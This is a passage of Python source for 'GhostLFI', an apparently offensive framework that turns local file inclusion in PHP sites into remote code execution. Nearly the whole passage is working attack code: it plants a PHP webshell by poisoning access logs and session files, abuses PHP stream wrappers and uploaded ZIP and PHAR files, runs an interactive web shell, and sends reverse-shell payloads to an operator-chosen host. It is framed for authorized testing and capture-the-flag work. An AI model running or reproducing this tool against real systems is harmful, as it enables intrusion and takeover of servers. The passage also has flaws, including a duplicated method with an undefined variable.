                        input(f"{Fore.YELLOW}Press Enter after setting up listener...{Style.RESET_ALL}")
                        self.interactive_shell()
                    
                    return True
            except:
                pass
        
        print(f"{Fore.RED}[✗] PHAR wrapper method failed{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] PHAR wrapper may not be enabled{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Original input: {original_path}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Final path used: {clean_path}shell.jpg{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] TIP: Enter path like:{Style.RESET_ALL}")
        print(f"    /profile_images/")
        print(f"    OR http://target.com/profile_images/shell.jpg")
        print(f"    NOT: target.com:port/profile_images/  (missing http://)")
        return False
    
    def _test_all_upload_methods(self, upload_path: str) -> bool:
        """Test all file upload methods automatically"""
        print(f"\n{Fore.CYAN}[AUTO-TEST] Testing all file upload methods...{Style.RESET_ALL}")
        
        # Test malicious images
        for filename in ['shell.gif', 'shell.jpg', 'shell.png']:
            print(f"\n{Fore.CYAN}━━━ Testing {filename} ━━━{Style.RESET_ALL}")
            if self._test_malicious_image(upload_path, filename):
                return True
        
        # Test ZIP wrapper
        print(f"\n{Fore.CYAN}━━━ Testing ZIP Wrapper ━━━{Style.RESET_ALL}")
        if self._test_zip_wrapper(upload_path):
            return True
        
        # Test PHAR wrapper
        print(f"\n{Fore.CYAN}━━━ Testing PHAR Wrapper ━━━{Style.RESET_ALL}")
        if self._test_phar_wrapper(upload_path):
            return True
        
        print(f"\n{Fore.RED}[✗] All file upload methods failed{Style.RESET_ALL}")
        print(f"\n{Fore.YELLOW}[SUGGESTIONS]{Style.RESET_ALL}")
        print(f"1. Verify files were uploaded successfully")
        print(f"2. Check upload path is correct")
        print(f"3. Try manual testing with curl commands above")
        print(f"4. Check if include() allows code execution")
        
        return False
    
    def test_log_poisoning(self) -> bool:
        """Automatically test file upload + LFI if files exist"""
        print(f"\n{Fore.CYAN}[AUTO-TEST] Testing uploaded files...{Style.RESET_ALL}")
        
        test_files = ['shell.gif', 'shell.jpg', 'shell.png']
        
        for filename in test_files:
            test_path = f'{upload_path}{filename}'
            print(f"{Fore.YELLOW}[*] Testing: {test_path}{Style.RESET_ALL}")
            
            try:
                response = self._send_payload(test_path + '&cmd=id', timeout=5)
                if 'uid=' in response.text and 'gid=' in response.text:
                    print(f"{Fore.GREEN}[✓] File upload LFI successful with {filename}!{Style.RESET_ALL}")
                    print(f"{Fore.GREEN}    Output: {response.text[:200]}...{Style.RESET_ALL}")
                    self.rce_method = 'file_upload'
                    self.successful_methods.append('File Upload LFI')
                    return True
            except:
                pass
        
        # Test ZIP wrapper
        print(f"{Fore.YELLOW}[*] Testing ZIP wrapper...{Style.RESET_ALL}")
        try:
            response = self._send_payload(f'zip://{upload_path}shell.jpg%23shell.php&cmd=id', timeout=5)
            if 'uid=' in response.text:
                print(f"{Fore.GREEN}[✓] ZIP wrapper successful!{Style.RESET_ALL}")
                self.rce_method = 'zip_wrapper'
                return True
        except:
            pass
        
        # Test PHAR wrapper
        print(f"{Fore.YELLOW}[*] Testing PHAR wrapper...{Style.RESET_ALL}")
        try:
            response = self._send_payload(f'phar://{upload_path}shell.jpg/shell.txt&cmd=id', timeout=5)
            if 'uid=' in response.text:
                print(f"{Fore.GREEN}[✓] PHAR wrapper successful!{Style.RESET_ALL}")
                self.rce_method = 'phar_wrapper'
                return True
        except:
            pass
        
        return False
    
    def test_log_poisoning(self) -> bool:
        """Test log poisoning attack"""
        print(f"\n{Fore.CYAN}[ADVANCED] Testing Log Poisoning{Style.RESET_ALL}")
        
        log_paths = [
            '/var/log/apache2/access.log',
            '/var/log/nginx/access.log',
            '/var/log/apache/access.log',
            '/var/log/httpd/access_log',
        ]
        
        # Ensure target_url has a page (e.g., /index.php)
        poison_url = self.target_url
        if not poison_url.endswith(('.php', '.html', '.htm')):
            # Add /index.php if no page specified
            if poison_url.endswith('/'):
                poison_url += 'index.php'
            else:
                poison_url += '/index.php'
            print(f"{Fore.YELLOW}[*] Using URL for poisoning: {poison_url}{Style.RESET_ALL}")
        
        # STEP 1: Check if ANY log is readable first
        print(f"{Fore.YELLOW}[STEP 1] Checking if logs are readable via LFI...{Style.RESET_ALL}")
        readable_log = None
        
        for log_path in log_paths:
            try:
                print(f"{Fore.YELLOW}[*] Testing readability: {log_path}{Style.RESET_ALL}")
                response = self._send_payload(log_path)
                
                # Check if we got log content (look for common log patterns)
                # Logs typically contain: IP addresses, GET/POST, HTTP/1.1, timestamps
                log_indicators = ['GET /', 'POST /', 'HTTP/1.', '200 ', '404 ', 'Mozilla', 'User-Agent']
                
                if any(indicator in response.text for indicator in log_indicators):
                    # Check it's not just HTML with these words
                    if not ('<html' in response.text.lower() and '</html>' in response.text.lower()):
                        print(f"{Fore.GREEN}[✓] Log is readable: {log_path}{Style.RESET_ALL}")
                        print(f"{Fore.CYAN}[DEBUG] Log snippet: {response.text[:200]}...{Style.RESET_ALL}")
                        readable_log = log_path
                        break
                    else:
                        print(f"{Fore.RED}[✗] Got HTML response, not log file{Style.RESET_ALL}")
                else:
                    print(f"{Fore.RED}[✗] Not readable or empty{Style.RESET_ALL}")
                    
            except Exception as e:
                print(f"{Fore.RED}[✗] Error: {str(e)}{Style.RESET_ALL}")
                continue
        
        if not readable_log:
            print(f"\n{Fore.RED}[✗] No readable log files found!{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[!] Log poisoning requires readable log files.{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[!] The LFI might not allow reading /var/log/ paths.{Style.RESET_ALL}")
            print(f"\n{Fore.CYAN}[TIP] Try other LFI techniques:{Style.RESET_ALL}")
            print(f"  - File upload + LFI (--test-file-upload)")
            print(f"  - Session poisoning (--test-session-poison)")
            print(f"  - PHP wrappers (--auto)")
            return False
        
        # STEP 2: Now poison the readable log
        print(f"\n{Fore.YELLOW}[STEP 2] Poisoning the readable log: {readable_log}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Injecting payload into User-Agent...{Style.RESET_ALL}")
        payload_code = '<?php system($_GET["cmd"]); ?>'
        try:
            headers = {'User-Agent': payload_code}
            self.session.get(poison_url, headers=headers, timeout=5, proxies=self.proxy)
            print(f"{Fore.GREEN}[✓] Payload injected into logs{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[✗] Failed to inject payload: {str(e)}{Style.RESET_ALL}")
            return False
        
        time.sleep(1)
        
        # STEP 3: Test if poisoning worked
        print(f"\n{Fore.YELLOW}[STEP 3] Testing if poisoning was successful...{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Including log with cmd=id: {readable_log}{Style.RESET_ALL}")
        
        try:
            response = self._send_payload(readable_log + '&cmd=id')
            
            # Debug output
            snippet = response.text[:500].replace('\n', ' ')
            print(f"{Fore.CYAN}[DEBUG] Response: {snippet}...{Style.RESET_ALL}")
            
            # Check for command output
            if 'uid=' in response.text and 'gid=' in response.text:
                print(f"{Fore.GREEN}[✓] Log poisoning successful: {readable_log}{Style.RESET_ALL}")
                # Find and extract the uid line
                for line in response.text.split('\n'):
                    if 'uid=' in line:
                        print(f"{Fore.GREEN}    Output: {line[:200]}{Style.RESET_ALL}")
                        break
                
                working_log = readable_log
            else:
                print(f"{Fore.YELLOW}[!] No command output detected automatically.{Style.RESET_ALL}")
                working_log = None
                
        except Exception as e:
            print(f"{Fore.RED}[✗] Error testing: {str(e)}{Style.RESET_ALL}")
            working_log = None
        
        # If auto-detection failed, offer manual verification
        if not working_log:
            print(f"\n{Fore.YELLOW}[!] Automatic detection failed.{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[?] Test manually with curl:{Style.RESET_ALL}")
            print(f"    curl '{self.target_url}?{self.parameter}={readable_log}&cmd=id'")
            print(f"{Fore.YELLOW}[?] Did you see uid= and gid= in the output?{Style.RESET_ALL}")
            manual_check = input(f"{Fore.YELLOW}Did it work? [y/N]: {Style.RESET_ALL}").strip().lower()
            
            if manual_check == 'y':
                working_log = readable_log
        
        if working_log:
            print(f"{Fore.GREEN}[✓] Log poisoning successful: {working_log}{Style.RESET_ALL}")
            
            self.rce_method = 'log_poisoning'
            self.successful_methods.append('log_poisoning')
            self.lfi_payload = working_log
            
            # Offer shells
            print(f"\n{Fore.GREEN}[✓] RCE Achieved via Log Poisoning!{Style.RESET_ALL}")
            print(f"\n{Fore.CYAN}Choose action:{Style.RESET_ALL}")
            print(f"  1 - Interactive web shell")
            print(f"  2 - Reverse shell")
            print(f"  3 - Both")
            print(f"  0 - Skip")
            
            shell_choice = input(f"{Fore.YELLOW}Select [0-3]: {Style.RESET_ALL}").strip()
            
            if shell_choice == '1':
                self.interactive_shell()
            elif shell_choice == '2':
                self.generate_reverse_shell()
            elif shell_choice == '3':
                self.generate_reverse_shell()
                input(f"{Fore.YELLOW}Press Enter after setting up listener...{Style.RESET_ALL}")
                self.interactive_shell()
            
            return True
        
        print(f"{Fore.RED}[✗] Log poisoning failed{Style.RESET_ALL}")
        return False

    # ==================== SESSION POISONING ====================
    
    def test_session_poisoning(self) -> bool:
        """Test session file poisoning"""
        print(f"\n{Fore.CYAN}[ADVANCED] Testing Session Poisoning{Style.RESET_ALL}")
        
        try:
            # Get session
            response = self.session.get(self.target_url, proxies=self.proxy)
            cookies = self.session.cookies.get_dict()
            
            if 'PHPSESSID' in cookies:
                session_id = cookies['PHPSESSID']
                print(f"{Fore.YELLOW}[*] Session ID: {session_id}{Style.RESET_ALL}")
                
                # Poison session
                poison_data = {self.parameter: '<?php system($_GET["cmd"]); ?>'}
                self.session.get(self.target_url, params=poison_data, proxies=self.proxy)
                
                # Include session file
                session_paths = [
                    f'/var/lib/php/sessions/sess_{session_id}',
                    f'/var/lib/php5/sessions/sess_{session_id}',
                    f'/tmp/sess_{session_id}',
                ]
                
                for session_path in session_paths:
                    response = self._send_payload(session_path + '&cmd=id')
                    
                    if 'uid=' in response.text and 'gid=' in response.text:
                        print(f"{Fore.GREEN}[✓] Session poisoning successful!{Style.RESET_ALL}")
                        print(f"{Fore.GREEN}    Session path: {session_path}{Style.RESET_ALL}")
                        print(f"{Fore.GREEN}    Output: {response.text[:200]}{Style.RESET_ALL}")
                        
                        self.rce_method = 'session_poisoning'
                        self.successful_methods.append('session_poisoning')
                        self.lfi_payload = session_path
                        
                        # Offer shells
                        print(f"\n{Fore.GREEN}[✓] RCE Achieved via Session Poisoning!{Style.RESET_ALL}")
                        print(f"\n{Fore.CYAN}Choose action:{Style.RESET_ALL}")
                        print(f"  1 - Interactive web shell")
                        print(f"  2 - Reverse shell")
                        print(f"  3 - Both")
                        print(f"  0 - Skip")
                        
                        shell_choice = input(f"{Fore.YELLOW}Select [0-3]: {Style.RESET_ALL}").strip()
                        
                        if shell_choice == '1':
                            self.interactive_shell()
                        elif shell_choice == '2':
                            self.generate_reverse_shell()
                        elif shell_choice == '3':
                            self.generate_reverse_shell()
                            input(f"{Fore.YELLOW}Press Enter after setting up listener...{Style.RESET_ALL}")
                            self.interactive_shell()
                        
                        return True
            
            print(f"{Fore.RED}[✗] Session poisoning failed{Style.RESET_ALL}")
            return False
        except:
            print(f"{Fore.RED}[✗] Session poisoning failed{Style.RESET_ALL}")
            return False

    # ==================== COMMAND EXECUTION ====================
    
    def execute_command(self, command: str) -> str:
        """Execute command using the discovered RCE method"""
        try:
            if self.rce_method == 'expect':
                payload = f'expect://{urllib.parse.quote(command)}'
                response = self._send_payload(payload)
                return response.text
            
            elif self.rce_method == 'data_base64':
                php_code = f'<?php system("{command}"); ?>'
                b64_encoded = base64.b64encode(php_code.encode()).decode()
                payload = f'data://text/plain;base64,{b64_encoded}'
                response = self._send_payload(payload)
                return response.text
            
            elif self.rce_method == 'data_plain':
                php_code = urllib.parse.quote(f'<?php system("{command}"); ?>')
                payload = f'data://text/plain,{php_code}'
                response = self._send_payload(payload)
                return response.text
            
            elif self.rce_method == 'php_input_get':
                payload = 'php://input'
                php_code = '<?php system($_GET["cmd"]); ?>'
                response = self._send_payload(payload + f'&cmd={urllib.parse.quote(command)}', method='POST', data=php_code)
                return response.text
            
            elif self.rce_method == 'php_input_request':
                payload = 'php://input'
                php_code = '<?php system($_REQUEST["cmd"]); ?>'
                response = self._send_payload(payload + f'&cmd={urllib.parse.quote(command)}', method='POST', data=php_code)
                return response.text
            
            elif self.rce_method == 'php_input_direct':
                payload = 'php://input'
                php_code = f'<?php system("{command}"); ?>'
                response = self._send_payload(payload, method='POST', data=php_code)
                return response.text
            
            elif self.rce_method == 'log_poisoning':
                # Assume log is already poisoned with cmd parameter
                if hasattr(self, 'lfi_payload') and self.lfi_payload:
                    response = self._send_payload(self.lfi_payload + f'&cmd={urllib.parse.quote(command)}')
                    return response.text
                else:
                    log_paths = ['/var/log/apache2/access.log', '/var/log/nginx/access.log']
                    for log_path in log_paths:
                        try:
                            response = self._send_payload(log_path + f'&cmd={urllib.parse.quote(command)}')
                            if len(response.text) > 10:
                                return response.text
                        except:
                            continue
                return "Command execution failed"
            
            elif self.rce_method == 'session_poisoning':
                # Use stored session path
                if hasattr(self, 'lfi_payload') and self.lfi_payload:
                    response = self._send_payload(self.lfi_payload + f'&cmd={urllib.parse.quote(command)}')
                    return response.text
                return "Session path not available"
            
            elif self.rce_method in ['phar_wrapper', 'zip_wrapper', 'file_upload']:
                # Use stored payload from manual/auto detection
                if hasattr(self, 'lfi_payload') and self.lfi_payload:
                    response = self._send_payload(self.lfi_payload + f'&cmd={urllib.parse.quote(command)}')
                    return response.text
                return "Payload path not available"
            
            elif self.rce_method and self.rce_method.startswith('rfi_'):
                # RFI command execution
                protocol = self.rce_method.split('_')[1]
                # This requires the RFI server to still be running
                print(f"{Fore.YELLOW}[!] Using RFI method - ensure your {protocol} server is still running{Style.RESET_ALL}")
                
                # The RFI payload should have cmd parameter
                from urllib.parse import urlparse
                parsed = urlparse(self.target_url)
                base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                
                # Get the last used RFI payload (this is a limitation - ideally store it)
                print(f"{Fore.RED}[!] RFI requires manual command execution{Style.RESET_ALL}")
                print(f"{Fore.YELLOW}[*] Append: &cmd={urllib.parse.quote(command)}{Style.RESET_ALL}")
                return f"RFI: Use your browser/curl with &cmd={command}"
            
            else:
                return f"{Fore.RED}[!] No RCE method available{Style.RESET_ALL}"
        
        except Exception as e:
            return f"{Fore.RED}[!] Command execution failed: {str(e)}{Style.RESET_ALL}"

    # ==================== REVERSE SHELL ====================
    
    def deploy_reverse_shell(self, lhost: str, lport: int) -> bool:
        """Deploy reverse shell"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"[PHASE 4] Reverse Shell Deployment")
        print(f"{'='*60}{Style.RESET_ALL}")
        
        print(f"{Fore.YELLOW}[*] Target: {lhost}:{lport}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Method: {self.rce_method}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[!] Make sure listener is running: nc -lvnp {lport}{Style.RESET_ALL}\n")
        
        shells = self.generate_reverse_shells(lhost, lport)
        
        for name, payload in shells.items():
            print(f"{Fore.YELLOW}[*] Trying {name}...{Style.RESET_ALL}")
            try:
                result = self.execute_command(payload)
                time.sleep(2)
                print(f"{Fore.GREEN}[+] Payload sent!{Style.RESET_ALL}")
            except:
                continue
        
        print(f"\n{Fore.GREEN}[+] All payloads sent! Check your listener.{Style.RESET_ALL}")
        return True

    # ==================== INTERACTIVE SHELL ====================
    
    def interactive_shell(self):
        """Interactive shell"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"[PHASE 5] Interactive Shell")
        print(f"{'='*60}{Style.RESET_ALL}")
        
        print(f"{Fore.GREEN}[+] Interactive shell started!{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] RCE Method: {self.rce_method}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Commands: 'exit' to quit, 'revshell' for reverse shell{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Commands: 'generate <type>' for payloads{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Commands: 'rfi <http|ftp|smb>' for RFI setup{Style.RESET_ALL}\n")
        
        while True:
            try:
                command = input(f"{Fore.GREEN}ghostops@target:~$ {Style.RESET_ALL}")
                
                if command.lower() in ['exit', 'quit']:
                    print(f"{Fore.YELLOW}[*] Exiting shell...{Style.RESET_ALL}")
                    break
                
                if command.lower() == 'revshell':
                    lhost = input(f"{Fore.YELLOW}Enter your IP: {Style.RESET_ALL}")
                    lport = int(input(f"{Fore.YELLOW}Enter your port [4444]: {Style.RESET_ALL}") or "4444")
                    self.deploy_reverse_shell(lhost, lport)
                    continue
                
                if command.lower().startswith('rfi'):
                    parts = command.split()
                    protocol = parts[1] if len(parts) > 1 else 'http'
                    lhost = input(f"{Fore.YELLOW}Enter your IP: {Style.RESET_ALL}")
                    self.setup_rfi_server(protocol, lhost)
                    continue
                
                if command.lower().startswith('generate'):
                    self._handle_generate_command(command)
                    continue
                
                if not command.strip():
                    continue
                
                output = self.execute_command(command)
                clean_output = self._extract_command_output(output)
                print(clean_output)
                
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}[*] Exiting shell...{Style.RESET_ALL}")
                break
            except Exception as e:
                print(f"{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}")
    
    def _handle_generate_command(self, command: str):
        """Handle payload generation commands in shell"""
        parts = command.split()
        if len(parts) < 2:
            print(f"{Fore.YELLOW}Usage: generate <shells|lfi|wrappers|bypass|revshell>{Style.RESET_ALL}")
            return
        
        gen_type = parts[1].lower()
        
        if gen_type == 'shells':
            print(f"\n{Fore.CYAN}[WEBSHELLS]{Style.RESET_ALL}")
            for name, shell in self.webshells.items():
                print(f"{Fore.YELLOW}{name}:{Style.RESET_ALL} {shell}")
        
        elif gen_type == 'lfi':
            print(f"\n{Fore.CYAN}[LFI PAYLOADS]{Style.RESET_ALL}")
            payloads = self.generate_lfi_payloads()
            for name, payload in list(payloads.items())[:5]:
                print(f"{Fore.YELLOW}{name}:{Style.RESET_ALL} {payload[:80]}...")
        
        elif gen_type == 'wrappers':
            print(f"\n{Fore.CYAN}[WRAPPER PAYLOADS]{Style.RESET_ALL}")
            payloads = self.generate_wrapper_payloads()
            for name, payload in payloads.items():
                if isinstance(payload, dict):
                    print(f"{Fore.YELLOW}{name}:{Style.RESET_ALL} (multiple variants)")
                else:
                    print(f"{Fore.YELLOW}{name}:{Style.RESET_ALL} {payload[:80]}...")
        
        elif gen_type == 'revshell':
            lhost = input(f"{Fore.YELLOW}Enter your IP: {Style.RESET_ALL}")
            lport = int(input(f"{Fore.YELLOW}Enter port [4444]: {Style.RESET_ALL}") or "4444")
            print(f"\n{Fore.CYAN}[REVERSE SHELLS]{Style.RESET_ALL}")
            shells = self.generate_reverse_shells(lhost, lport)
            for name, shell in list(shells.items())[:3]:
                print(f"{Fore.YELLOW}{name}:{Style.RESET_ALL}")
                print(f"  {shell}")
        
        else:
            print(f"{Fore.RED}Unknown type. Use: shells, lfi, wrappers, revshell{Style.RESET_ALL}")

    # ==================== AUTO-EXPLOIT ====================
    
    def auto_exploit(self, include_advanced: bool = False) -> bool:
        """Automatic exploitation workflow"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"[AUTO-EXPLOIT] Starting Automated Exploitation")
        print(f"{'='*60}{Style.RESET_ALL}")
        
        # Phase 1: Config
        self.check_php_config()
        
        # Phase 2: LFI Test
        self.test_basic_lfi()
        
        # Phase 3: Wrappers (HTB order)
        if self.test_expect_wrapper():
            return True
        
        if self.test_data_wrapper():
            return True
        
        if self.test_php_input_wrapper():
            return True
        
        # Phase 3.4: RFI Test
        print(f"\n{Fore.CYAN}[*] Testing Remote File Inclusion (RFI)...{Style.RESET_ALL}")
        rfi_possible = self.test_rfi_vulnerability()
        
        if rfi_possible:
            print(f"{Fore.GREEN}[+] RFI is possible! Use --rfi flag for setup instructions{Style.RESET_ALL}")
        
        # Phase 4: Advanced (if enabled)
        if include_advanced:
            print(f"\n{Fore.CYAN}[ADVANCED] Trying Advanced Techniques{Style.RESET_ALL}")
            
            if self.test_log_poisoning():
                return True
            
            if self.test_session_poisoning():
                return True
        
        print(f"\n{Fore.RED}{'='*60}")
        print(f"[FAIL] No RCE method successful")
        print(f"{'='*60}{Style.RESET_ALL}")
        
        if rfi_possible:
            print(f"\n{Fore.YELLOW}[*] However, RFI is possible!{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[*] Use: --rfi-setup http/ftp/smb{Style.RESET_ALL}")
        
        return False

    # ==================== UTILITIES ====================
    
    def _send_payload(self, payload: str, method: str = 'GET', data: str = None, timeout: int = 10) -> requests.Response:
        """Send payload to target"""
        params = {self.parameter: payload}
        
        if method == 'GET':
            return self.session.get(self.target_url, params=params, proxies=self.proxy, timeout=timeout)
        elif method == 'POST':
            return self.session.post(self.target_url, params=params, data=data, proxies=self.proxy, timeout=timeout)
    
    def _extract_command_output(self, response: str) -> str:
        """Extract clean command output"""
        clean = re.sub(r'<[^>]+>', '', response)
        clean = re.sub(r'\n\s*\n', '\n', clean)
        return clean.strip()
    
    def print_summary(self):
        """Print exploitation summary"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"[SUMMARY] Exploitation Results")
        print(f"{'='*60}{Style.RESET_ALL}")
        
        if self.successful_methods:
            print(f"{Fore.GREEN}[✓] Successful RCE Methods:{Style.RESET_ALL}")
            for method in self.successful_methods:
                print(f"    - {method}")
        else:
            print(f"{Fore.RED}[✗] No successful RCE methods found{Style.RESET_ALL}")
        
        if self.rce_method:
            print(f"\n{Fore.GREEN}[+] Active RCE Method: {self.rce_method}{Style.RESET_ALL}")
        
        if self.config_status:
            print(f"\n{Fore.YELLOW}[*] PHP Configuration:{Style.RESET_ALL}")
            for key, value in self.config_status.items():
                status = f"{Fore.GREEN}✓{Style.RESET_ALL}" if value else f"{Fore.RED}✗{Style.RESET_ALL}"
                print(f"    {status} {key}")
    
    # ==================== PAYLOAD DISPLAY ====================
    
    def show_payloads(self, payload_type: str):
        """Display generated payloads"""
        if payload_type == 'lfi':
            print(f"\n{Fore.CYAN}[LFI BYPASS PAYLOADS]{Style.RESET_ALL}")
            payloads = self.generate_lfi_payloads()
            for name, payload in payloads.items():
                print(f"{Fore.YELLOW}{name:20}{Style.RESET_ALL} {payload[:80]}...")
        
        elif payload_type == 'wrappers':
            print(f"\n{Fore.CYAN}[WRAPPER PAYLOADS]{Style.RESET_ALL}")
            payloads = self.generate_wrapper_payloads("whoami")
            for name, payload in payloads.items():
                print(f"{Fore.YELLOW}{name:20}{Style.RESET_ALL}")
                if isinstance(payload, dict):
                    for k, v in payload.items():
                        print(f"  {k}: {v[:60]}...")
                else:
                    print(f"  {payload}")
        
        elif payload_type == 'shells':
            print(f"\n{Fore.CYAN}[WEBSHELLS]{Style.RESET_ALL}")
            for name, shell in self.webshells.items():
                print(f"{Fore.YELLOW}{name:15}{Style.RESET_ALL} {shell}")
        
        elif payload_type == 'revshell':
            lhost = input(f"{Fore.YELLOW}Enter LHOST: {Style.RESET_ALL}")
            lport = int(input(f"{Fore.YELLOW}Enter LPORT [4444]: {Style.RESET_ALL}") or "4444")
            print(f"\n{Fore.CYAN}[REVERSE SHELLS FOR {lhost}:{lport}]{Style.RESET_ALL}")
            shells = self.generate_reverse_shells(lhost, lport)
            for name, shell in shells.items():
                print(f"\n{Fore.YELLOW}{name}:{Style.RESET_ALL}")
                print(f"  {shell}")


def main():
    parser = argparse.ArgumentParser(
        description='GhostLFI - Local File Inclusion Exploitation Framework by Ghost Ops Security',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  # Auto-exploit (recommended)
  python3 ghostlfi.py -u http://target.com/page.php -p file --auto
  
  # Auto-exploit with advanced techniques
  python3 ghostlfi.py -u http://target.com/page.php -p file --auto --advanced
  
  # Interactive shell
  python3 ghostlfi.py -u http://target.com/page.php -p file --auto --shell
  
  # Reverse shell
  python3 ghostlfi.py -u http://target.com/page.php -p file --auto --revshell --lhost 10.10.10.1
  
  # Generate payloads
  python3 ghostlfi.py -u http://target.com/page.php -p file --generate lfi
  python3 ghostlfi.py -u http://target.com/page.php -p file --generate wrappers
  python3 ghostlfi.py -u http://target.com/page.php -p file --generate shells
  python3 ghostlfi.py -u http://target.com/page.php -p file --generate revshell
  
  # Test specific techniques
  python3 ghostlfi.py -u http://target.com/page.php -p file --test-bypass
  python3 ghostlfi.py -u http://target.com/page.php -p file --test-log-poison
  python3 ghostlfi.py -u http://target.com/page.php -p file --test-session-poison
  python3 ghostlfi.py -u http://target.com/page.php -p file --test-rfi
  
  # RFI Server Setup
  python3 ghostlfi.py -u http://target.com/page.php -p file --rfi-setup http --rfi-lhost 10.10.10.1
  python3 ghostlfi.py -u http://target.com/page.php -p file --rfi-setup ftp --rfi-lhost 10.10.10.1
  python3 ghostlfi.py -u http://target.com/page.php -p file --rfi-setup smb --rfi-lhost 10.10.10.1

Ghost Ops Security | For Authorized Testing Only
        '''
    )
    
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('-p', '--parameter', required=True, help='Vulnerable parameter')
    parser.add_argument('--proxy', help='Proxy (http://127.0.0.1:8080)')
    
    # Modes
    parser.add_argument('--auto', action='store_true', help='Auto-exploit mode (recommended)')
    parser.add_argument('--advanced', action='store_true', help='Include advanced techniques (log/session poisoning)')
    parser.add_argument('--shell', action='store_true', help='Interactive shell')
    parser.add_argument('--revshell', action='store_true', help='Reverse shell')
    parser.add_argument('--lhost', help='Your IP for reverse shell')
    parser.add_argument('--lport', type=int, default=4444, help='Your port for reverse shell')
    
    # Testing
    parser.add_argument('--test-bypass', action='store_true', help='Test LFI bypass techniques')
    parser.add_argument('--test-log-poison', action='store_true', help='Test log poisoning')
    parser.add_argument('--test-session-poison', action='store_true', help='Test session poisoning')
    parser.add_argument('--test-file-upload', action='store_true', help='Test file upload + LFI exploitation')
    parser.add_argument('--upload-path', help='Upload directory path (e.g., ./uploads/)')
    parser.add_argument('--lfi-url', help='LFI endpoint URL if different from upload page (e.g., http://target.com/index.php)')
    parser.add_argument('--lfi-param', help='LFI parameter if different from main parameter (e.g., language)')
    parser.add_argument('--test-rfi', action='store_true', help='Test Remote File Inclusion (RFI)')
    
    # RFI Setup
    parser.add_argument('--rfi-setup', choices=['http', 'ftp', 'smb'], help='Setup RFI server (http/ftp/smb)')
    parser.add_argument('--rfi-lhost', help='Your IP for RFI server')
    parser.add_argument('--rfi-lport', type=int, help='Port for RFI server')
    
    # Generation
    parser.add_argument('--generate', choices=['lfi', 'wrappers', 'shells', 'revshell'], help='Generate payloads')
    
    args = parser.parse_args()
    
    # Normalize URL - ensure it has http:// or https://
    target_url = args.url
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'http://' + target_url
        print(f"{Fore.YELLOW}[*] Added http:// prefix: {target_url}{Style.RESET_ALL}")
    
    exploiter = UltimateLFIExploiter(target_url, args.parameter, args.proxy)
    exploiter.print_banner()
    
    # Generate mode
    if args.generate:
        exploiter.show_payloads(args.generate)
        sys.exit(0)
    
    # Test specific techniques
    if args.test_bypass:
        exploiter.test_lfi_bypasses()
        sys.exit(0)
    
    if args.test_log_poison:
        exploiter.test_log_poisoning()
        sys.exit(0)
    
    if args.test_session_poison:
        exploiter.test_session_poisoning()
        sys.exit(0)
    
    if args.test_file_upload:
        # Store original values
        original_url = exploiter.target_url
        original_param = exploiter.parameter
        
        # If LFI is on different page, update before testing
        if args.lfi_url:
            print(f"{Fore.CYAN}[*] Upload page: {original_url}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}[*] LFI page: {args.lfi_url}{Style.RESET_ALL}")
            exploiter.target_url = args.lfi_url
            if args.lfi_param:
                exploiter.parameter = args.lfi_param
        
        exploiter.test_file_upload_exploitation(args.upload_path)
        
        # Restore original values
        exploiter.target_url = original_url
        exploiter.parameter = original_param
        sys.exit(0)
    
    if args.test_rfi:
        exploiter.test_rfi_vulnerability()
        print(f"\n{Fore.YELLOW}[*] To setup RFI server, use:{Style.RESET_ALL}")
        print(f"  --rfi-setup http")
        print(f"  --rfi-setup ftp")
        print(f"  --rfi-setup smb")
        sys.exit(0)
    
    # RFI Setup
    if args.rfi_setup:
        exploiter.setup_rfi_server(args.rfi_setup, args.rfi_lhost, args.rfi_lport)
        sys.exit(0)
    
    # Auto-exploit mode
    if args.auto or not any([args.test_bypass, args.test_log_poison, args.test_session_poison]):
        success = exploiter.auto_exploit(include_advanced=args.advanced)
        
        exploiter.print_summary()
        
        if success and exploiter.rce_method:
            print(f"\n{Fore.GREEN}{'='*60}")
            print(f"[SUCCESS] RCE Achieved!")
            print(f"{'='*60}{Style.RESET_ALL}")
            
            if args.revshell:
                if args.lhost:
                    exploiter.deploy_reverse_shell(args.lhost, args.lport)
                else:
                    lhost = input(f"\n{Fore.YELLOW}Enter your IP: {Style.RESET_ALL}")
                    lport_input = input(f"{Fore.YELLOW}Enter port [4444]: {Style.RESET_ALL}")
                    lport = int(lport_input) if lport_input else 4444
                    exploiter.deploy_reverse_shell(lhost, lport)
            
            elif args.shell:
                exploiter.interactive_shell()
            
            else:
                print(f"\n{Fore.YELLOW}[?] What would you like to do?{Style.RESET_ALL}")
                print(f"  1) Interactive shell")
                print(f"  2) Reverse shell")
                print(f"  3) Generate payloads")
                print(f"  4) Exit")
                
                choice = input(f"\n{Fore.YELLOW}Choice [1]: {Style.RESET_ALL}") or "1"
                
                if choice == "1":
                    exploiter.interactive_shell()
                elif choice == "2":
                    lhost = input(f"{Fore.YELLOW}Enter your IP: {Style.RESET_ALL}")
